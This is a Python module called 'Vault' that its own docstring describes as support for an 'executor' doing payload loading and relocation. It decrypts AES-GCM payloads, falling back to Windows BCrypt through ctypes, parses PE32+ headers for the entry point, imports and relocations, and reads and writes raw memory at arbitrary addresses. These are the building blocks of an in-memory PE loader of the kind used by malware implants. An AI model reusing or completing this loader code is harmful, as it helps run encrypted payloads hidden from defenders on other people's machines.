# -*- coding: utf-8 -*-
"""
Vault — cryptographic helpers, memory peek/poke, and PE binary inspection.
Used by executor for payload loading and relocation.
"""

import base64
import hashlib
import hmac
import struct
import ctypes


def generate_auth(nonce, ts, key):
    """
    Generate HMAC-SHA256 signature for authentication.
    """
    msg = (nonce + str(ts)).encode()
    return hmac.new(key, msg, hashlib.sha256).hexdigest()


def unseal(key_hex, data_b64):
    """
    Decrypt AES-GCM encrypted data using the provided key.
    Tries cryptography library first, falls back to Windows BCrypt.
    """
    try:
        return _unseal_lib(key_hex, data_b64)
    except Exception:
        return _unseal_native(key_hex, data_b64)


def _unseal_lib(key_hex, data_b64):
    """Decrypt using cryptography.hazmat.primitives.ciphers.aead.AESGCM."""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(data_b64)
    gcm = AESGCM(key)
    return gcm.decrypt(raw[:12], raw[12:], None)


def _unseal_native(key_hex, data_b64):
    """Decrypt using Windows BCrypt API (fallback)."""
    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(data_b64)
    iv, tag, ct = raw[:12], raw[-16:], raw[12:-16]

    lib = ctypes.WinDLL("bcrypt")
    alg_id = "AES\0".encode("utf-16-le")
    mode_prop = "ChainingMode\0".encode("utf-16-le")
    mode_val = "ChainingModeGCM\0".encode("utf-16-le")

    h_alg = ctypes.c_void_p()
    lib.BCryptOpenAlgorithmProvider(ctypes.byref(h_alg), alg_id, None, 0)
    lib.BCryptSetProperty(h_alg, mode_prop, mode_val, len(mode_val), 0)

    h_key = ctypes.c_void_p()
    lib.BCryptGenerateSymmetricKey(
        h_alg, ctypes.byref(h_key), None, 0,
        ctypes.c_char_p(key), len(key), 0,
    )

    class _AuthInfo(ctypes.Structure):
        _fields_ = [
            ("sz", ctypes.c_ulong),
            ("v", ctypes.c_ulong),
            ("p1", ctypes.c_void_p),
            ("n1", ctypes.c_ulong),
            ("p2", ctypes.c_void_p),
            ("n2", ctypes.c_ulong),
            ("p3", ctypes.c_void_p),
            ("n3", ctypes.c_ulong),
            ("p4", ctypes.c_void_p),
            ("n4", ctypes.c_ulong),
            ("x1", ctypes.c_ulong),
            ("x2", ctypes.c_ulonglong),
            ("fl", ctypes.c_ulong),
        ]

    iv_buf = ctypes.create_string_buffer(iv)
    tag_buf = ctypes.create_string_buffer(tag)

    params = _AuthInfo()
    params.sz = ctypes.sizeof(params)
    params.v = 1
    params.p1 = ctypes.cast(iv_buf, ctypes.c_void_p)
    params.n1 = 12
    params.p3 = ctypes.cast(tag_buf, ctypes.c_void_p)
    params.n3 = 16

    ct_buf = ctypes.create_string_buffer(ct)
    pt_buf = ctypes.create_string_buffer(len(ct))
    out_len = ctypes.c_ulong(0)

    status = lib.BCryptDecrypt(
        h_key, ct_buf, len(ct), ctypes.byref(params),
        None, 0, pt_buf, len(ct), ctypes.byref(out_len), 0,
    )

    lib.BCryptDestroyKey(h_key)
    lib.BCryptCloseAlgorithmProvider(h_alg, 0)

    if status != 0:
        return None
    return pt_buf.raw[:out_len.value]


def inspect_binary(data):
    """
    Parse PE header and extract section information.
    Returns a dict with entry point, base address, size, imports,
    relocations, and section descriptors.
    """
    if len(data) < 256 or struct.unpack_from("<H", data, 0)[0] != 0x5A4D:
        return None

    def _rd(off, fmt):
        return struct.unpack_from(fmt, data, off)[0]

    # e_lfanew
    o = _rd(0x3C, "<I")
    if o + 4 > len(data) or _rd(o, "<I") != 0x4550:
        return None
    fh = o + 4
    ns = _rd(fh + 2, "<H")
    os_ = _rd(fh + 16, "<H")
    oh = fh + 20
    if _rd(oh, "<H") != 0x20B:          # PE32+
        return None
    nd = _rd(oh + 108, "<I")             # number of data directories
    dd = oh + 112
    sc = []
    so = oh + os_
    for i in range(ns):
        p = so + i * 40
        sc.append((
            _rd(p + 8, "<I"),   # VirtualSize
            _rd(p + 12, "<I"),  # VirtualAddress
            _rd(p + 16, "<I"),  # SizeOfRawData
            _rd(p + 20, "<I"),  # PointerToRawData
            _rd(p + 36, "<I"),  # Characteristics
        ))
    return {
        "e": _rd(oh + 16, "<I"),          # AddressOfEntryPoint
        "b": _rd(oh + 24, "<Q"),          # ImageBase
        "s": _rd(oh + 56, "<I"),          # SizeOfImage
        "h": _rd(oh + 60, "<I"),          # SizeOfHeaders
        "i": _rd(dd + 8, "<I") if nd > 1 else 0,   # Import directory RVA
        "r": _rd(dd + 40, "<I") if nd > 5 else 0,  # Relocation directory RVA
        "z": _rd(dd + 44, "<I") if nd > 5 else 0,  # Relocation size
        "c": sc,
    }


def peek(addr, fmt):
    """
    Read a value from memory at the given address.
    """
    sz = struct.calcsize(fmt)
    return struct.unpack_from(
        fmt, (ctypes.c_char * sz).from_address(addr), 0,
    )[0]


def store(addr, fmt, val):
    """
    Write a value to memory at the given address.
    """
    sz = struct.calcsize(fmt)
    struct.pack_into(
        fmt, (ctypes.c_char * sz).from_address(addr), 0, val,
    )